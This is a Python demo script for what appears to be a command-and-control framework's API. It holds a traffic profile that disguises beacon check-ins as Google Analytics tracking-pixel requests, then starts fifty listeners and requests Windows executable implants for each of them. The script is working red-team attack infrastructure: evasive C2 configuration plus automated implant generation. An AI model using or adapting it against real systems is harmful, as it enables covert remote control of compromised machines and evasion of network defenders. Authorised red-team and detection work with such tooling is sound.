import requests
from yarl import URL

"""
A demo script meant to populate the server with various data

The functions here also demo how to use the API, etc.
"""

profile = """
# make our C2 look like a Google Web Bug
# https://developers.google.com/analytics/resources/articles/gaTrackingTroubleshooting
#
# Author: @armitagehacker

set sleeptime "5000";


http-get {
	set uri "/___utm.gif";
	client {
		parameter "utmac" "UA-2202604-2";
		parameter "utmcn" "1";
		parameter "utmcs" "ISO-8859-1";
		parameter "utmsr" "1280x1024";
		parameter "utmsc" "32-bit";
		parameter "utmul" "en-US";

		metadata {
			base64url;
			header "utmcc";
		}
	}

	server {
		header "Content-Type" "image/gif";

		output {
			print;
		}
	}
}

http-post {
	set uri "/__utm.gif";
	set verb "GET";
	client {
		id {
			parameter "utmac";
		}

		parameter "utmcn" "1";
		parameter "utmcs" "ISO-8859-1";
		parameter "utmsr" "1280x1024";
		parameter "utmsc" "32-bit";
		parameter "utmul" "en-US";

		output {
			base64url;
			header "utmcc";
		}
	}

	server {
		header "Content-Type" "image/gif";

		output {
			print;
		}
	}
}
"""


# setup server variables
api_url = URL("http://10.0.0.30:45045/api/v1")


def start_listener(host, port, type="http", name="http_listener"):
    """
    Start a listener
    """
    listener_spawn_url = api_url / "listeners"

    listener_data = {
        "listener_host": host,
        "listener_port": port,
        "listener_type": type,
        "listener_name": name,
        "listener_notes": "Generic Listener",
        "listener_profile_name": "profile",
        "listener_profile_contents": profile,
    }

    r = requests.post(str(listener_spawn_url), json=listener_data)
    print(r.status_code)
    print(r.text)


def generate_implants():
    """
    Generate implants for each listener listed
    """
    # get a list of listeners
    listener_list_url = api_url / "listeners"
    r = requests.get(str(listener_list_url))
    list_of_listeners = (r.json()).get("data")

    # loop over listeners, and then generate
    build_payload_url = api_url / "build"

    for listener in list_of_listeners:
        listener_uuid = listener.get("listener_uuid")

        req_data = {
            "implant_variant": "http_wininet",
            "output_format": "exe",
            "implant_name": "my_implant",
            "implant_listener_uuid": listener_uuid,
        }

        r = requests.post(str(build_payload_url), json=req_data)
        print(r.status_code)
        print(r.text)


def main():
    print("========================================")
    print("Generating some data...")
    print("========================================")
    for i in range(0, 50):
        # Start some listeners
        start_listener("0.0.0.0", 9090 + int(i))

    # generate some implants for those listeners...
    # These will generate in the background, and might take a second to generate.
    for i in range(0, 1):
        generate_implants()


main()
